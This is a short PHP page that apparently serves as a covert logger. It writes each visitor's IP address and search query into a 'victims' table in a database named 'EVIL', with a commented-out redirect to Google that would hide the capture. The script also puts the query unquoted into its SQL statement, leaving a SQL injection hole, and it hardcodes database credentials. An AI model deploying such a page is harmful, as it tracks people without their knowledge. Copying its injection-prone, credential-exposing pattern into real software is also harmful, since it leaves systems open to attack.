<!DOCTYPE html>

<html>

    <head> 

        <title>Form: insert</title> 
    </head> 

    <body>
        <?php
            $server = "localhost";
            $username = "php";
            $password = "A1f2i3r4e";
            $database = "EVIL"; 

            $conn = mysqli_connect($server, $username, $password, $database);
            if (!$conn) {
                die("Connection failed: " . mysqli_connect_error());
                }
            echo "Connected successfully";
            echo "<br/>";

            $ip = $_SERVER['REMOTE_ADDR']; 
            $q = htmlspecialchars($_GET['query']);

        
            $sql = "INSERT INTO victims (ip, query) VALUES ('{$ip}', {$q});";
            $result = mysqli_query($conn, $sql);
            
            echo "<br/>";
            echo $result ? "Success!" : "Failure: " . mysqli_error($conn); 
            echo "<br/>";

            $url= "https://www.google.com/search?q=" . $q;
            //header("Location: $url"); 

        ?>

    </body> 

</html> 
